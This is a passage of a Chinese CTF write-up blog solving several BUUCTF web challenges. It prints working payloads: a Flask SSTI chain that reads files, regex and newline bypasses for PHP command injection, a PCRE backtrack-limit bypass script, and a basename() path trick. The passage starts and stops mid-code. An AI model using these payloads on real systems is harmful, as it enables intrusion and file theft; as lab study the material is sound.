%&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411200146505.png" alt="image-20230411200146505"></p><p>解密后发现flag位置</p><p>直接cat的话会不给读</p><p><img src="../images/image-20230411200248871.png" alt="image-20230411200248871"></p><p>然后尝试一下新的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411200430933.png" alt="image-20230411200430933"></p><p><strong>这道题有两个解</strong></p><p><a href="https://blog.csdn.net/weixin_44214568/article/details/124125565">第一种解，不需要算pin，这是一种新的ssti读取文件的方法(可以当作积累)</a></p><p><a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">第二种解，flask算pin，之前做的题有写过</a></p><p><img src="../images/image-20230411200822462.png" alt="image-20230411200822462"></p><p><strong>这样也能调出来，之前学到的积累</strong></p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure><p>就是简单的无数字字母rce  加  限制长度</p><p><a href="https://www.cnblogs.com/Dreamerwd/p/15421284.html">这篇文章讲了就是assert()函数的使用和如何绕过disable_function进行命令执行</a></p><p><strong>通过环境变量LD_PRELOAD+mail劫持so来执行系统命令</strong>     就是利用这个来进行绕过</p><p>当然蚁剑也有这个功能  就是绕过<strong>disable_function</strong>   来进行命令执行</p><p><strong>就是使用蚁剑的这个功能来进行绕过</strong></p><p><img src="../images/image-20230411214728985.png" alt="image-20230411214728985"></p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>题目</p><p><img src="../images/image-20230412195450258.png" alt="image-20230412195450258"></p><p>网页源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一个if考察<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取的是未经url解码的查询字符串，因此将<code>_</code>url编码后可绕过。（url编码大小写不敏感）</p><p>第二个if考察<code>preg_match()</code>只能匹配单行字符串，会将换行符后的字符串忽略。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%5Fu%5Fp%5Ft=23333%0a</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412200039405.png" alt="image-20230412200039405"></p><p> <strong>secrettw.php</strong></p><p><img src="../images/image-20230412200134805.png" alt="image-20230412200134805"></p><p><img src="../images/image-20230412200153748.png" alt="image-20230412200153748"></p><p>源码给这些东西</p><p>控制台执行输出结果  说是<strong>post一个Merak</strong></p><p><img src="../images/image-20230412200248976.png" alt="image-20230412200248976"></p><p>这是jsfuck编码</p><p><img src="../images/image-20230412200445109.png" alt="image-20230412200445109"></p><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>猜测<code>getIp()</code>可能通过<code>X-Forwarder-For</code>或<code>client-ip</code>头可以绕过。</p><p>因为这里提示了<strong>“Local access only”</strong></p><p><code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; )</code>可由<code>data:\\</code>伪协议绕过</p><p>这里的话<code>php://input</code>应该也能绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secrettw.php?2333=data://text/plain,todat+is+a+happy+day</span><br><span class="line">空格需要url编码</span><br></pre></td></tr></table></figure><p><code>change()</code>函数将传入的字符串进行base64解码然后进行简单加密。</p><p>我们需要传入<code>flag.php</code>故需要先将<code>flag.php</code>逐字符进行加密，然后进行base64编码。</p><p>对change()的解码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cstr = <span class="string">&quot;flag.php&quot;</span></span><br><span class="line">tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cstr)):</span><br><span class="line">    ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(cstr[i])- i*<span class="number">2</span>)</span><br><span class="line">    tmp += ch</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(tmp.encode()))</span><br></pre></td></tr></table></figure><p><strong>最终payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6ad8a2e0-f0f7-49c9-8087-ac1021dbe1a2.node3.buuoj.cn/secrettw.php?2333=data://text/plain,todat+is+a+happy+day&amp;file=ZmpdYSZmXGI%3D</span><br></pre></td></tr></table></figure><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>题目</p><p><img src="../images/image-20230412214146848.png" alt="image-20230412214146848"></p><p>考察的是  <strong>sql盲注</strong></p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>题目</p><p><img src="../images/image-20230412214603190.png" alt="image-20230412214603190"></p><p><strong>知识点：PHP利用PCRE回溯次数限制绕过某些安全限制，多行绕过preg_match函数</strong></p><p><strong>preg_mathch</strong>加上   <code>m</code>   的话就不行了  ，因为<code>m</code>是多行独立匹配</p><p><strong>题目源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412215324802.png" alt="image-20230412215324802"></p><p><strong>第一种解法</strong></p><p>因为<code>preg_match</code>只能匹配第一行，所以这里可以采用多行绕过。<br>因为<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>修改了环境变量，所以只能使用绝对路径使用cat命令，<code>cat</code>命令在<code>/bin</code>文件夹下</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412215628734.png" alt="image-20230412215628734"></p><p><strong>第二种解法</strong></p><p>关于<code>preg_match</code>，有p神曾经讲的<code>PRCE</code>,但是这个题目复习环境是<strong>get</strong>传参，而非post，会导致414报错，记录一下原题wp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&quot;http://challenges.fbctf.com:8085/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p>超出100万次的话会返回false  从而绕过if判断</p><p>这里的话是不能绕过  强等于的   <code>===</code></p><p><code>if(false===0)</code>    这样就是不能相等了</p><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p><img src="../images/image-20230412220712263.png" alt="image-20230412220712263"></p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>这道题的解法并不是在考察咋样绕过随机数那里</p><p>而是考察这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则的匹配ban掉了config.php。然后会highlight_file()：</p><p>可以发现这里加上了<strong>basename()</strong> 可能是为了跨目录读文件，而问题正好出在了这里，演示</p><p><strong>当我访问index.php时，我可以在后面加上一些东西，比如/index.php/config.php，这样仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码了，而题目告诉FLAG就在config.php里，这道题就做完了。所以说，那个随机数就是个障眼法</strong><br><strong>可以发现发现，这个正则匹配了config.php/为$_SERVER[‘PHP_SELF’]的结尾</strong></p><p><img src="../images/image-20230412222258528.png" alt="image-20230412222258528"></p><p>老套路了，可以用%0d之类的来污染绕过，这样仍然访问得到index.php:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%0d   bcd都行</span><br></pre></td></tr></table></figure><p><strong>好多东西都行</strong></p><p><strong>一堆不可见字符都行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x80 0x81 0x82 0x83 0x84 0x85 0x86 0x87 0x88 0x89 0x8a 0x8b 0x8c 0x8d 0x8e 0x8f 0x90 0x91 0x92 0x93 0x94 0x95 0x96 0x97 0x98 0x99 0x9a 0x9b 0x9c 0x9d 0x9e 0x9f 0xa0 0xa1 0xa2 0xa3 0xa4 0xa5 0xa6 0xa7 0xa8 0xa9 0xaa 0xab 0xac 0xad 0xae 0xaf 0xb0 0xb1 0xb2 0xb3 0xb4 0xb5 0xb6 0xb7 0xb8 0xb9 0xba 0xbb 0xbc 0xbd 0xbe 0xbf 0xc0 0xc1 0xc2 0xc3 0xc4 0xc5 0xc6 0xc7 0xc8 0xc9 0xca 0xcb 0xcc 0xcd 0xce 0xcf 0xd0 0xd1 0xd2 0xd3 0xd4 0xd5 0xd6 0xd7 0xd8 0xd9 0xda 0xdb 0xdc 0xdd 0xde 0xdf 0xe0 0xe1 0xe2 0xe3 0xe4 0xe5 0xe6 0xe7 0xe8 0xe9 0xea 0xeb 0xec 0xed 0xee 0xef 0xf0 0xf1 0xf2 0xf3 0xf4 0xf5 0xf6 0xf7 0xf8 0xf9 0xfa 0xfb 0xfc 0xfd 0xfe 0xff</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412222418112.png" alt="image-20230412222418112"></p><p><strong>$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。</strong></p><p><strong>但是正则过滤了/config.php/*$/i</strong></p><p><code>basename()</code>函数的一个问题，它会去掉文件名开头的非ASCII值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(basename(&quot;xffconfig.php&quot;)); // =&gt; config.php</span><br><span class="line">var_dump(basename(&quot;config.php/xff&quot;)); // =&gt; config.php</span><br></pre></td></tr></table></figure><p>所以这样就能绕过正则了，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3.112.201.75:8003/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>题目</p><p><img src="../images/image-20230412223240234.png" alt="image-20230412223240234"></p><p>题目给了提示   就是给买到     <code>lv6</code></p><p>然后尝试去购买，发现找不到页数，然后就查看源码，发现<code>lv5</code>等都是由<code>lv5.png</code>组成，所以就是写个脚本来遍历一下，看在哪也能找到<code>lv6.png</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fb27b666-6efb-4d33-9167-72b5c08b84ee.node4.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">    urls = url + <span class="built_in">str</span>(i)</span><br><span class="line">    rs=requests.get(urls)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\r&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;已检测&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;页&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> rs.text):</span><br><span class="line">        <span class="built_in">print</span>(<span 